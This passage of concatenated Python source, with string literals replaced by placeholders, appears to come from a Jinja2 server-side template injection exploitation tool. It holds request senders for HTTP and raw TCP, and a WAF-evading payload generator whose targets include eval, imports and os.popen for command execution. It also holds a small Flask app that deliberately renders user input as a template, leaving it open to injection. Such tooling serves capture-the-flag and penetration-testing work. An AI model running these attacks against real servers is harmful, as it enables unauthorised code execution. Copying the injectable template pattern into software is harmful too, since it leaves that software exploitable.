: <EOL> return None <EOL> assert will_print is not None , "<STR_LIT>" <EOL> payload_dict = { self . subm . target_field : payload } <EOL> method = self . subm . form [ "<STR_LIT>" ] <EOL> assert isinstance ( method , str ) <EOL> payload_param = random_fill ( self . subm . form ) <EOL> payload_param . update ( payload_dict ) <EOL> new_subm = RequestSubmitter ( <EOL> url = self . subm . url , <EOL> method = method , <EOL> target_field = args_target_field , <EOL> params = payload_param if method == "<STR_LIT>" else { } , <EOL> data = payload_param if method != "<STR_LIT>" else { } , <EOL> requester = self . subm . req , <EOL> ) <EOL> if self . subm . tamperers : <EOL> for tamperer in self . subm . tamperers : <EOL> new_subm . add_tamperer ( tamperer ) <EOL> if will_print : <EOL> if self . test_payload_eval_args ( self . test_eval , new_subm ) : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" , bold = True ) , <EOL> ) <EOL> else : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" , bold = True ) , <EOL> ) <EOL> else : <EOL> logger . info ( <EOL> "<STR_LIT>" <EOL> + "<STR_LIT>" , <EOL> ) <EOL> return new_subm , EvalArgsModePayloadGen ( will_print ) <EOL> </s>
<s> from flask import Flask , request <EOL> from jinja2 import Template <EOL> import re <EOL> app = Flask ( __name__ ) <EOL> @ app . route ( "<STR_LIT>" ) <EOL> def index ( ) : <EOL> name = request . args . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> if not re . findall ( r"<STR_LIT>" , name ) : <EOL> t = Template ( "<STR_LIT>" + name ) <EOL> return t . render ( ) <EOL> else : <EOL> t = Template ( "<STR_LIT>" ) <EOL> return t . render ( ) <EOL> if __name__ == "<STR_LIT>" : <EOL> app . run ( host = "<STR_LIT>" , port = <NUM_LIT> ) <EOL> </s>
<s> import logging <EOL> import traceback <EOL> import time <EOL> import socket <EOL> import ssl <EOL> import re <EOL> from urllib . parse import parse_qs <EOL> from typing import Union , Tuple <EOL> import requests <EOL> from fenjing . colorize import colored <EOL> from . const import DEFAULT_USER_AGENT <EOL> logger = logging . getLogger ( "<STR_LIT>" ) <EOL> Response = Tuple [ int , str ] <EOL> def check_line_break ( req_pattern : bytes ) -> Union [ None , bool ] : <EOL> linebreak_pos = req_pattern . find ( b"<STR_LIT>" ) <EOL> if not linebreak_pos : <EOL> return None <EOL> linebreak = req_pattern [ linebreak_pos - <NUM_LIT> : linebreak_pos ] <EOL> linebreak = bytes ( c for c in linebreak if c in b"<STR_LIT>" ) <EOL> if linebreak == b"<STR_LIT>" or linebreak == b"<STR_LIT>" : <EOL> return True <EOL> elif linebreak == b"<STR_LIT>" : <EOL> return False <EOL> return None <EOL> def fix_line_break ( req_pattern : bytes ) -> bytes : <EOL> line_header , _ , body = req_pattern . partition ( b"<STR_LIT>" ) <EOL> return line_header . replace ( b"<STR_LIT>" , b"<STR_LIT>" ) + b"<STR_LIT>" + body <EOL> def get_tail ( req_pattern : bytes ) -> Tuple [ Union [ bytes , None ] , int ] : <EOL> lbs = [ <EOL> b"<STR_LIT>" , <EOL> b"<STR_LIT>" , <EOL> b"<STR_LIT>" , <EOL> ] <EOL> for lb in lbs : <EOL> if req_pattern [ - len ( lb ) : ] == lb : <EOL> count = <NUM_LIT> <EOL> while req_pattern [ - count * len ( lb ) : ] == lb * count : <EOL> count += <NUM_LIT> <EOL> count -= <NUM_LIT> <EOL> return lb , count <EOL> return None , <NUM_LIT> <EOL> def check_tail ( req_pattern : bytes ) -> bool : <EOL> return get_tail ( req_pattern ) [ <NUM_LIT> ] == <NUM_LIT> <EOL> def fix_tail ( req_pattern : bytes ) -> bytes : <EOL> lb , count = get_tail ( req_pattern ) <EOL> if lb is None : <EOL> return req_pattern <EOL> if count <= <NUM_LIT> : <EOL> return req_pattern + lb * ( <NUM_LIT> - count ) <EOL> return req_pattern [ : - len ( lb ) * <NUM_LIT> - count ] <EOL> class TCPRequester : <EOL> def __init__ ( <EOL> self , <EOL> host : str , <EOL> port : int , <EOL> use_ssl : bool , <EOL> retry_times = <NUM_LIT> , <EOL> interval = <NUM_LIT> , <EOL> ) : <EOL> self . host = host <EOL> self . port = port <EOL> self . use_ssl = use_ssl <EOL> self . interval = interval <EOL> self . retry_times = retry_times <EOL> self . last_request_time = None <EOL> def _get_socket ( self ) : <EOL> sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) <EOL> if self . use_ssl : <EOL> ssl_context = ssl . create_default_context ( ssl . Purpose . SERVER_AUTH ) <EOL> sock = ssl_context . wrap_socket ( sock ) <EOL> sock . connect ( ( self . host , self . port ) ) <EOL> return sock <EOL> def _recv_all ( self , sock , bufsize = <NUM_LIT> ) : <EOL> data = b"<STR_LIT>" <EOL> while True : <EOL> chunk = sock . recv ( bufsize ) <EOL> if not chunk : <EOL> break <EOL> data += chunk <EOL> return data <EOL> def _request_once ( self , request : bytes ) : <EOL> if self . last_request_time : <EOL> duration = time . perf_counter ( ) - self . last_request_time <EOL> if duration < self . interval : <EOL> time . sleep ( self . interval - duration ) <EOL> self . last_request_time = time . perf_counter ( ) <EOL> try : <EOL> sock = self . _get_socket ( ) <EOL> except Exception as exception : <EOL> logger . warning ( "<STR_LIT>" , repr ( exception ) ) <EOL> logger . debug ( traceback . format_exc ( ) ) <EOL> return None <EOL> try : <EOL> sock . sendall ( request ) <EOL> except Exception as exception : <EOL> logger . warning ( "<STR_LIT>" , repr ( exception ) ) <EOL> logger . debug ( traceback . format_exc ( ) ) <EOL> return None <EOL> response = None <EOL> try : <EOL> response = self . _recv_all ( sock ) <EOL> except Exception as exception : <EOL> logger . warning ( "<STR_LIT>" , repr ( exception ) ) <EOL> logger . debug ( traceback . format_exc ( ) ) <EOL> return None <EOL> response = response . decode ( ) <EOL> status_code_result = re . search ( r"<STR_LIT>" , response . partition ( "<STR_LIT>" ) [ <NUM_LIT> ] ) <EOL> assert status_code_result is not None , "<STR_LIT>" + response <EOL> try : <EOL> sock . close ( ) <EOL> except Exception as exception : <EOL> logger . warning ( "<STR_LIT>" , repr ( exception ) ) <EOL> return int ( status_code_result . group ( <NUM_LIT> ) ) , response . partition ( "<STR_LIT>" ) [ <NUM_LIT> ] <EOL> def request ( self , request : bytes ) -> Union [ Response , None ] : <EOL> for _ in range ( self . retry_times ) : <EOL> resp = self . _request_once ( request ) <EOL> if resp is not None : <EOL> return resp <EOL> return None <EOL> class HTTPRequester : <EOL> def __init__ ( <EOL> self , <EOL> interval = <NUM_LIT> , <EOL> timeout = <NUM_LIT> , <EOL> retry_times = <NUM_LIT> , <EOL> retry_interval = <NUM_LIT> , <EOL> retry_status = ( <NUM_LIT> , ) , <EOL> user_agent = DEFAULT_USER_AGENT , <EOL> headers = None , <EOL> extra_params_querystr = None , <EOL> extra_data_querystr = None , <EOL> proxy = None , <EOL> ) : <EOL> self . interval = interval <EOL> self . timeout = timeout <EOL> self . retry_times = retry_times <EOL> self . retry_interval = retry_interval <EOL> self . retry_status = retry_status <EOL> self . session = requests . Session ( ) <EOL> self . session . headers . update ( { "<STR_LIT>" : user_agent } ) <EOL> self . last_request_time = <NUM_LIT> <EOL> self . extra_params = { } <EOL> self . extra_data = { } <EOL> if interval > <NUM_LIT> : <EOL> logger . warning ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> interval , <EOL> ) <EOL> if headers : <EOL> self . session . headers . update ( headers ) <EOL> if extra_params_querystr : <EOL> self . extra_params = parse_qs ( extra_params_querystr ) <EOL> if extra_data_querystr : <EOL> self . extra_data = parse_qs ( extra_data_querystr ) <EOL> if proxy : <EOL> self . session . proxies = { "<STR_LIT>" : proxy , "<STR_LIT>" : proxy } <EOL> def request_once ( self , ** kwargs ) : <EOL> duration = time . perf_counter ( ) - self . last_request_time <EOL> if duration < self . interval : <EOL> time . sleep ( self . interval - duration ) <EOL> if "<STR_LIT>" not in kwargs : <EOL> kwargs [ "<STR_LIT>" ] = self . timeout <EOL> resp = None <EOL> try : <EOL> resp = self . session . request ( ** kwargs ) <EOL> except Exception as exception : <EOL> logger . warning ( "<STR_LIT>" , repr ( exception ) ) <EOL> logger . debug ( traceback . format_exc ( ) ) <EOL> return None <EOL> if resp . status_code in self . retry_status : <EOL> logger . warning ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" , bold = True ) , <EOL> colored ( "<STR_LIT>" , str ( resp . status_code ) ) , <EOL> ) <EOL> logger . warning ( <EOL> "<STR_LIT>" <EOL> ) <EOL> time . sleep ( <NUM_LIT> ) <EOL> return None <EOL> if resp . status_code not in [ <NUM_LIT> , <NUM_LIT> ] : <EOL> logger . warning ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , str ( resp . status_code ) ) , <EOL> ) <EOL> self . last_request_time = time . perf_counter ( ) <EOL> return resp <EOL> def request ( self , ** kwargs ) : <EOL> if self . extra_params : <EOL> params = self . extra_params . copy ( ) <EOL> params . update ( kwargs . get ( "<STR_LIT>" , { } ) ) <EOL> kwargs [ "<STR_LIT>" ] = params <EOL> if self . extra_data : <EOL> if kwargs [ "<STR_LIT>" ] not in ( "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) : <EOL> logger . warning ( <EOL> "<STR_LIT>" , <EOL> kwargs [ "<STR_LIT>" ] , <EOL> ) <EOL> data = self . extra_data . copy ( ) <EOL> data . update ( kwargs . get ( "<STR_LIT>" , { } ) ) <EOL> kwargs [ "<STR_LIT>" ] = data <EOL> for _ in range ( self . retry_times ) : <EOL> resp = self . request_once ( ** kwargs ) <EOL> if resp is not None : <EOL> return resp <EOL> return None <EOL> </s>
<s> import re <EOL> import logging <EOL> import sys <EOL> import math <EOL> import random <EOL> import string <EOL> from collections import defaultdict <EOL> from typing import ( <EOL> Callable , <EOL> DefaultDict , <EOL> List , <EOL> Dict , <EOL> TypeVar , <EOL> Union , <EOL> Any , <EOL> Tuple , <EOL> ) <EOL> from pprint import pformat <EOL> from . colorize import colored <EOL> from . const import * <EOL> from . options import Options <EOL> ContextVariable = Dict [ str , Any ] <EOL> if sys . version_info >= ( <NUM_LIT> , <NUM_LIT> ) : <EOL> from typing import Literal <EOL> LiteralTarget = Tuple [ Literal [ "<STR_LIT>" ] , str ] <EOL> ExpressionTarget = Tuple [ Literal [ "<STR_LIT>" ] , int , List [ "<STR_LIT>" ] ] <EOL> EncloseUnderTarget = Tuple [ Literal [ "<STR_LIT>" ] , int , List [ "<STR_LIT>" ] ] <EOL> EncloseTarget = Tuple [ Literal [ "<STR_LIT>" ] , List [ "<STR_LIT>" ] ] <EOL> UnsatisfiedTarget = Tuple [ Literal [ "<STR_LIT>" ] , ] <EOL> OneofTarget = Tuple [ Literal [ "<STR_LIT>" ] , List [ "<STR_LIT>" ] ] <EOL> WithContextVarTarget = Tuple [ Literal [ "<STR_LIT>" ] , str ] <EOL> JinjaContextVarTarget = Tuple [ Literal [ "<STR_LIT>" ] , str ] <EOL> FlaskContextVarTarget = Tuple [ Literal [ "<STR_LIT>" ] , str ] <EOL> RequirePython3Target = Tuple [ Literal [ "<STR_LIT>" ] , str ] <EOL> ZeroTarget = Tuple [ Literal [ "<STR_LIT>" ] , ] <EOL> PositiveIntegerTarget = Tuple [ Literal [ "<STR_LIT>" ] , int ] <EOL> IntegerTarget = Tuple [ Literal [ "<STR_LIT>" ] , int ] <EOL> StringConcatTarget = Tuple [ Literal [ "<STR_LIT>" ] , ] <EOL> StringPercentTarget = Tuple [ Literal [ "<STR_LIT>" ] , ] <EOL> StringPercentLowerCTarget = Tuple [ Literal [ "<STR_LIT>" ] , ] <EOL> StringUnderlineTarget = Tuple [ Literal [ "<STR_LIT>" ] , ] <EOL> StringLowerCTarget = Tuple [ Literal [ "<STR_LIT>" ] , ] <EOL> StringManyPercentLowerCTarget = Tuple [ Literal [ "<STR_LIT>" ] , int ] <EOL> StringManyFormatCTarget = Tuple [ Literal [ "<STR_LIT>" ] , int ] <EOL> CharTarget = Tuple [ Literal [ "<STR_LIT>" ] , str ] <EOL> StringTarget = Tuple [ Literal [ "<STR_LIT>" ] , str ] <EOL> FormularSumTarget = Tuple [ Literal [ "<STR_LIT>" ] , List [ "<STR_LIT>" ] ] <EOL> AttributeTarget = Tuple [ Literal [ "<STR_LIT>" ] , "<STR_LIT>" , str ] <EOL> ItemTarget = Tuple [ Literal [ "<STR_LIT>" ] , "<STR_LIT>" , str ] <EOL> ChassAttributeTarget = Tuple [ Literal [ "<STR_LIT>" ] , "<STR_LIT>" , str ] <EOL> ChainedAttriuteItemTarget = Tuple [ Literal [ "<STR_LIT>" ] , ... ] <EOL> ImportFuncTarget = Tuple [ Literal [ "<STR_LIT>" ] , ] <EOL> EvalFuncTarget = Tuple [ Literal [ "<STR_LIT>" ] , ] <EOL> EvalTarget = Tuple [ Literal [ "<STR_LIT>" ] , str ] <EOL> ConfigTarget = Tuple [ Literal [ "<STR_LIT>" ] , ] <EOL> ModuleOSTarget = Tuple [ Literal [ "<STR_LIT>" ] , ] <EOL> OSPopenObj = Tuple [ Literal [ "<STR_LIT>" ] , ] <EOL> OSPopenRead = Tuple [ Literal [ "<STR_LIT>" ] , ] <EOL> Target = Union [ <EOL> LiteralTarget , <EOL> ExpressionTarget , <EOL> EncloseUnderTarget , <EOL> EncloseTarget , <EOL> UnsatisfiedTarget , <EOL> OneofTarget , <EOL> WithContextVarTarget , <EOL> FlaskContextVarTarget , <EOL> JinjaContextVarTarget , <EOL> ZeroTarget , <EOL> PositiveIntegerTarget , <EOL> IntegerTarget , <EOL> StringConcatTarget , <EOL> StringPercentTarget , <EOL> StringPercentLowerCTarget , <EOL> StringUnderlineTarget , <EOL> StringLowerCTarget , <EOL> StringManyPercentLowerCTarget , <EOL> StringManyFormatCTarget , <EOL> CharTarget , <EOL> StringTarget , <EOL> FormularSumTarget , <EOL> AttributeTarget , <EOL> ItemTarget , <EOL> ChassAttributeTarget , <EOL> ChainedAttriuteItemTarget , <EOL> ImportFuncTarget , <EOL> EvalFuncTarget , <EOL> EvalTarget , <EOL> ConfigTarget , <EOL> ModuleOSTarget , <EOL> OSPopenObj , <EOL> OSPopenRead , <EOL> ] <EOL> else : <EOL> LiteralTarget = Tuple <EOL> ExpressionTarget = Tuple <EOL> EncloseUnderTarget = Tuple <EOL> EncloseTarget = Tuple <EOL> UnsatisfiedTarget = Tuple <EOL> OneofTarget = Tuple <EOL> WithContextVarTarget = Tuple <EOL> FlaskContextVarTarget = Tuple <EOL> JinjaContextVarTarget = Tuple <EOL> RequirePython3Target = Tuple <EOL> Target = Tuple <EOL> ExpressionGeneratorReturn = TypeVar ( "<STR_LIT>" , bound = List [ Target ] ) <EOL> ExpressionGenerator = Callable [ ... , ExpressionGeneratorReturn ] <EOL> TargetAndSubTargets = List [ Tuple [ Target , List [ Target ] ] ] <EOL> PayloadGeneratorResult = Tuple [ str , ContextVariable , TargetAndSubTargets ] <EOL> expression_gens : DefaultDict [ str , List [ ExpressionGenerator ] ] = defaultdict ( list ) <EOL> logger = logging . getLogger ( "<STR_LIT>" ) <EOL> gen_weight_default = { <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> } <EOL> precedence = [ <EOL> [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] , <EOL> [ "<STR_LIT>" , "<STR_LIT>" ] , <EOL> [ <EOL> "<STR_LIT>" , <EOL> ] , <EOL> [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] , <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] , <EOL> [ <EOL> "<STR_LIT>" <EOL> ] , <EOL> [ <EOL> "<STR_LIT>" , <EOL> ] , <EOL> [ <EOL> "<STR_LIT>" , <EOL> ] , <EOL> [ <EOL> "<STR_LIT>" , <EOL> ] , <EOL> [ <EOL> "<STR_LIT>" , <EOL> ] , <EOL> [ <EOL> "<STR_LIT>" , <EOL> ] , <EOL> ] [ : : - <NUM_LIT> ] <EOL> precedence = { name : i for i , lst in enumerate ( precedence ) for name in lst } <EOL> def expression_gen ( f : ExpressionGenerator ) : <EOL> gen_type = re . match ( "<STR_LIT>" , f . __name__ ) <EOL> if not gen_type : <EOL> raise RuntimeError ( f"<STR_LIT>" ) <EOL> expression_gens [ gen_type . group ( <NUM_LIT> ) ] . append ( f ) <EOL> def unparse ( tree ) : <EOL> content = "<STR_LIT>" <EOL> for target , subtree in tree : <EOL> if target [ <NUM_LIT> ] == WITH_CONTEXT_VAR : <EOL> continue <EOL> if target [ <NUM_LIT> ] in [ LITERAL , FLASK_CONTEXT_VAR , JINJA_CONTEXT_VAR ] : <EOL> content += target [ <NUM_LIT> ] <EOL> elif target [ <NUM_LIT> ] == ONEOF : <EOL> content += unparse ( subtree ) <EOL> elif subtree : <EOL> content += unparse ( subtree ) <EOL> return content <EOL> def iter_subtree ( tree ) : <EOL> for target , subtree in tree : <EOL> if subtree and ( <EOL> target [ <NUM_LIT> ] <EOL> not in [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) : <EOL> yield from iter_subtree ( subtree ) <EOL> yield unparse ( tree ) , tree <EOL> def find_bad_exprs ( tree , is_expr_bad_func ) : <EOL> nodes = [ ] <EOL> for payload_unparsed , targetlist in iter_subtree ( tree ) : <EOL> if is_expr_bad_func ( payload_unparsed ) : <EOL> nodes . append ( ( payload_unparsed , targetlist ) ) <EOL> return nodes <EOL> def join_target ( sep , targets ) : <EOL> assert len ( targets ) >= <NUM_LIT> <EOL> ret = [ <EOL> targets [ <NUM_LIT> ] , <EOL> ] <EOL> for target in targets [ <NUM_LIT> : ] : <EOL> ret . append ( sep ) <EOL> ret . append ( target ) <EOL> return ret <EOL> def tree_precedence ( tree ) : <EOL> answer = float ( "<STR_LIT>" ) <EOL> for target , sub_target_tree in tree : <EOL> if target [ <NUM_LIT> ] in [ LITERAL , UNSATISFIED ] : <EOL> pass <EOL> elif target [ <NUM_LIT> ] == EXPRESSION : <EOL> answer = min ( answer , target [ <NUM_LIT> ] ) <EOL> elif target [ <NUM_LIT> ] in [ PLUS , MULTIPLY , MOD , ATTRIBUTE , ITEM , MODULE_OS , FUNCTION_CALL ] : <EOL> sub_target_answer = tree_precedence ( sub_target_tree ) <EOL> if sub_target_answer : <EOL> answer = min ( answer , sub_target_answer ) <EOL> elif target [ <NUM_LIT> ] in precedence : <EOL> answer = min ( answer , precedence [ target [ <NUM_LIT> ] ] ) <EOL> elif sub_target_tree : <EOL> sub_target_answer = tree_precedence ( sub_target_tree ) <EOL> if sub_target_answer : <EOL> answer = min ( answer , sub_target_answer ) <EOL> return answer if answer != float ( "<STR_LIT>" ) else None <EOL> def targets_from_pattern ( pattern : str , mapping : Dict [ str , Target ] ) -> List [ Target ] : <EOL> result = [ ] <EOL> toparse = "<STR_LIT>" <EOL> while pattern : <EOL> found = False <EOL> for keyword , target in mapping . items ( ) : <EOL> if pattern . startswith ( keyword ) : <EOL> result . append ( ( LITERAL , toparse ) ) <EOL> result . append ( target ) <EOL> toparse = "<STR_LIT>" <EOL> pattern = removeprefix_string ( pattern , keyword ) <EOL> found = True <EOL> break <EOL> if not found : <EOL> toparse += pattern [ <NUM_LIT> ] <EOL> pattern = pattern [ <NUM_LIT> : ] <EOL> if toparse : <EOL> result . append ( ( LITERAL , toparse ) ) <EOL> return result <EOL> def str_escape ( value : str , quote = "<STR_LIT>" ) : <EOL> return value . replace ( "<STR_LIT>" , "<STR_LIT>" ) . replace ( quote , "<STR_LIT>" + quote ) <EOL> def transform_int_chars_charcodes ( int_chars , charcodes , keepfirst = False ) : <EOL> charcode_dict = { str ( int ( chr ( x ) , <NUM_LIT> ) ) : chr ( x ) for x in charcodes } <EOL> return "<STR_LIT>" . join ( charcode_dict . get ( c , c ) for c in int_chars ) <EOL> def transform_int_chars_unicode ( int_chars ) : <EOL> return [ <EOL> transform_int_chars_charcodes ( int_chars , charcodes ) <EOL> for charcodes in UNICODE_INT_CHARCODES <EOL> ] <EOL> def removeprefix_string ( text : str , prefix : str ) -> str : <EOL> if text . startswith ( prefix ) : <EOL> return text [ len ( prefix ) : ] <EOL> return text <EOL> class CacheByRepr : <EOL> def __init__ ( self ) : <EOL> self . cache = { } <EOL> def __setitem__ ( self , k , v ) : <EOL> repr_k = repr ( k ) <EOL> self . cache [ repr_k ] = self . cache . get ( repr_k , [ ] ) <EOL> self . cache [ repr ( k ) ] . append ( ( k , v ) ) <EOL> def __getitem__ ( self , k ) : <EOL> repr_k = repr ( k ) <EOL> for k_store , v in self . cache . get ( repr_k , [ ] ) : <EOL> if k_store == k : <EOL> return v <EOL> raise KeyError ( f"<STR_LIT>" ) <EOL> def __delitem__ ( self , k ) : <EOL> del self . cache [ repr ( k ) ] <EOL> def __contains__ ( self , k ) : <EOL> repr_k = repr ( k ) <EOL> for k_store , _ in self . cache . get ( repr_k , [ ] ) : <EOL> if k_store == k : <EOL> return True <EOL> return False <EOL> def __iter__ ( self ) : <EOL> return ( k for k_repr in self . cache for k , v in self . cache [ k_repr ] ) <EOL> def clear ( self ) : <EOL> self . cache = { } <EOL> class PayloadGenerator : <EOL> def __init__ ( <EOL> self , <EOL> waf_func : WafFunc , <EOL> context : Union [ Dict , None ] = None , <EOL> callback : Union [ Callable [ [ str , Dict ] , None ] , None ] = None , <EOL> options : Union [ Options , None ] = None , <EOL> waf_expr_func : Union [ WafFunc , None ] = None , <EOL> ) : <EOL> self . waf_func = ( <EOL> waf_func <EOL> if waf_expr_func is None <EOL> else ( lambda x : waf_func ( x ) and waf_expr_func ( x ) ) <EOL> ) <EOL> self . context = context if context else { } <EOL> self . cache_by_repr = CacheByRepr ( ) <EOL> self . used_count = defaultdict ( int ) <EOL> self . options = options if options else Options ( ) <EOL> if self . options . detect_mode == DetectMode . FAST : <EOL> for k , v in gen_weight_default . items ( ) : <EOL> self . used_count [ k ] += v <EOL> self . callback = callback if callback else ( lambda x , y : None ) <EOL> def create_generate_func_register ( ) : <EOL> generate_funcs = [ ] <EOL> def register ( checker_func ) : <EOL> def _wraps ( runner_func ) : <EOL> generate_funcs . append ( ( checker_func , runner_func ) ) <EOL> return runner_func <EOL> return _wraps <EOL> return generate_funcs , register <EOL> generate_funcs , register_generate_func = create_generate_func_register ( ) <EOL> def generate_by_list ( <EOL> self , targets : List [ Target ] <EOL> ) -> Union [ PayloadGeneratorResult , None ] : <EOL> str_result , used_context , tree = "<STR_LIT>" , { } , [ ] <EOL> for target in targets : <EOL> for checker , runner in self . generate_funcs : <EOL> if not checker ( self , target ) : <EOL> continue <EOL> result = runner ( self , target ) <EOL> if result is None : <EOL> return None <EOL> s , c , subs = result <EOL> str_result += s <EOL> used_context . update ( c ) <EOL> tree . append ( ( target , subs ) ) <EOL> break <EOL> else : <EOL> raise RuntimeError ( "<STR_LIT>" ) <EOL> if not self . waf_func ( str_result ) : <EOL> return None <EOL> return str_result , used_context , tree <EOL> @ register_generate_func ( lambda self , target : target [ <NUM_LIT> ] == LITERAL ) <EOL> def literal_generate ( <EOL> self , target : LiteralTarget <EOL> ) -> Union [ PayloadGeneratorResult , None ] : <EOL> return ( target [ <NUM_LIT> ] , { } , [ ] ) <EOL> @ register_generate_func ( lambda self , target : target in self . cache_by_repr ) <EOL> def cache_generate ( self , target : Target ) -> Union [ PayloadGeneratorResult , None ] : <EOL> return self . cache_by_repr [ target ] <EOL> @ register_generate_func ( lambda self , target : target [ <NUM_LIT> ] == EXPRESSION ) <EOL> def expression_generate ( <EOL> self , target : ExpressionTarget <EOL> ) -> Union [ PayloadGeneratorResult , None ] : <EOL> assert isinstance ( target [ <NUM_LIT> ] , list ) and all ( <EOL> isinstance ( sub_target , tuple ) for sub_target in target [ <NUM_LIT> ] <EOL> ) , repr ( target ) [ : <NUM_LIT> ] <EOL> return self . generate_by_list ( target [ <NUM_LIT> ] ) <EOL> @ register_generate_func ( lambda self , target : target [ <NUM_LIT> ] == ENCLOSE_UNDER ) <EOL> def enclose_under_generate ( <EOL> self , target : EncloseUnderTarget <EOL> ) -> Union [ PayloadGeneratorResult , None ] : <EOL> assert isinstance ( target [ <NUM_LIT> ] , tuple ) , repr ( target ) <EOL> result = self . generate_by_list ( [ target [ <NUM_LIT> ] ] ) <EOL> if not result : <EOL> return <EOL> str_result , used_context , tree = result <EOL> result_precedence = tree_precedence ( tree ) <EOL> assert result_precedence is not None , str_result + repr ( tree ) <EOL> should_enclose = ( <EOL> result_precedence <= target [ <NUM_LIT> ] <EOL> if result_precedence == precedence [ "<STR_LIT>" ] <EOL> else result_precedence < target [ <NUM_LIT> ] <EOL> ) <EOL> if should_enclose : <EOL> logger . debug ( <EOL> ( <EOL> "<STR_LIT>" <EOL> + "<STR_LIT>" <EOL> ) , <EOL> result_precedence , <EOL> target [ <NUM_LIT> ] , <EOL> ) <EOL> ret = self . generate_by_list ( [ ( ENCLOSE , target [ <NUM_LIT> ] ) ] ) <EOL> return ret <EOL> else : <EOL> logger . debug ( <EOL> ( <EOL> "<STR_LIT>" <EOL> + "<STR_LIT>" <EOL> + "<STR_LIT>" <EOL> ) , <EOL> result_precedence , <EOL> target [ <NUM_LIT> ] , <EOL> pformat ( target [ <NUM_LIT> ] ) , <EOL> ) <EOL> return str_result , used_context , tree <EOL> @ register_generate_func ( lambda self , target : target [ <NUM_LIT> ] == UNSATISFIED ) <EOL> def unsatisfied_generate ( self , target : UnsatisfiedTarget ) -> None : <EOL> return None <EOL> @ register_generate_func ( lambda self , target : target [ <NUM_LIT> ] == ONEOF ) <EOL> def oneof_generate ( <EOL> self , target : OneofTarget <EOL> ) -> Union [ PayloadGeneratorResult , None ] : <EOL> _ , * alternative_targets = target <EOL> for req in alternative_targets : <EOL> ret = self . generate_by_list ( req ) <EOL> if ret is not None : <EOL> return ret <EOL> return None <EOL> @ register_generate_func ( lambda self , target : target [ <NUM_LIT> ] == WITH_CONTEXT_VAR ) <EOL> def with_context_var_generate ( <EOL> self , target : WithContextVarTarget <EOL> ) -> Union [ PayloadGeneratorResult , None ] : <EOL> return ( "<STR_LIT>" , { target [ <NUM_LIT> ] : self . context [ target [ <NUM_LIT> ] ] } , [ ] ) <EOL> @ register_generate_func ( lambda self , target : target [ <NUM_LIT> ] == JINJA_CONTEXT_VAR ) <EOL> def jinja_context_var_generate ( <EOL> self , target : JinjaContextVarTarget <EOL> ) -> Union [ PayloadGeneratorResult , None ] : <EOL> return ( target [ <NUM_LIT> ] , { } , [ ] ) <EOL> @ register_generate_func ( lambda self , target : target [ <NUM_LIT> ] == FLASK_CONTEXT_VAR ) <EOL> def flask_context_var_generate ( <EOL> self , target : FlaskContextVarTarget <EOL> ) -> Union [ PayloadGeneratorResult , None ] : <EOL> if self . options . environment != TemplateEnvironment . FLASK : <EOL> return None <EOL> return ( target [ <NUM_LIT> ] , { } , [ ] ) <EOL> @ register_generate_func ( lambda self , target : target [ <NUM_LIT> ] == REQUIRE_PYTHON3 ) <EOL> def require_python3_generate ( <EOL> self , target : RequirePython3Target <EOL> ) -> Union [ PayloadGeneratorResult , None ] : <EOL> if self . options . python_version != PythonEnvironment . PYTHON3 : <EOL> return None <EOL> return ( "<STR_LIT>" , { } , [ ] ) <EOL> @ register_generate_func ( lambda self , target : True ) <EOL> def common_generate ( self , gen_req : Target ) -> Union [ PayloadGeneratorResult , None ] : <EOL> gen_type , * args = gen_req <EOL> if gen_type not in expression_gens or len ( expression_gens [ gen_type ] ) == <NUM_LIT> : <EOL> logger . error ( "<STR_LIT>" , gen_type ) <EOL> return None <EOL> gens = expression_gens [ gen_type ] . copy ( ) <EOL> if self . options . detect_mode == DetectMode . FAST : <EOL> gens . sort ( key = lambda gen : self . used_count [ gen . __name__ ] , reverse = True ) <EOL> for gen in gens : <EOL> logger . debug ( "<STR_LIT>" , gen . __name__ ) <EOL> gen_ret : List [ Target ] = gen ( self . context , * args ) <EOL> ret = self . generate_by_list ( gen_ret ) <EOL> if ret is None : <EOL> continue <EOL> logger . debug ( "<STR_LIT>" , gen . __name__ ) <EOL> result = ret [ <NUM_LIT> ] <EOL> self . callback ( <EOL> CALLBACK_GENERATE_PAYLOAD , <EOL> { <EOL> "<STR_LIT>" : gen_type , <EOL> "<STR_LIT>" : args , <EOL> "<STR_LIT>" : gen_ret , <EOL> "<STR_LIT>" : result , <EOL> } , <EOL> ) <EOL> if gen_type in ( INTEGER , STRING ) and result != str ( args [ <NUM_LIT> ] ) : <EOL> logger . info ( <EOL> "<STR_LIT>" . format ( <EOL> great = colored ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> gen_type = colored ( "<STR_LIT>" , gen_type , bold = True ) , <EOL> args_repl = colored ( <EOL> "<STR_LIT>" , "<STR_LIT>" . join ( repr ( arg ) for arg in args ) <EOL> ) , <EOL> result = colored ( "<STR_LIT>" , result ) , <EOL> ) <EOL> ) <EOL> elif gen_type in ( <EOL> 